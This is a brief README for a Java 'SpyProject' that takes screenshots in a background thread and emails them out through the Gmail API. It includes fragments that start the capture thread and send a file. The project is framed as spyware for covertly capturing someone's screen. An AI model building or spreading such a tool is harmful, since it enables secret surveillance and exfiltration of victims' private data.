# SpyProject
That's spy project that can do screenshots from PC and send those screenshots to your email.

I was realize screenshots by using default libraries (java.io), and I was realize forwading screenshots by using GMail API.

Taking a screenshot should be do by using MultiThreading and using PrntScreen class in my java program

Example:
```
static PrntScreenThread threadOfPrntScreenClass;
public static void main(String[] args) throws Exception {

        threadOfPrntScreenClass = new PrntScreenThread();
        Thread prntScreenThread = new Thread(threadOfPrntScreenClass);
        prntScreenThread.start();
}
```
And for sending messages we should be using class instance of GMailer class with sendMail method

Example:

```
File file = new File(pathToFile);
gmailer.sendMail("SpyProgram subject", " ", file);
```


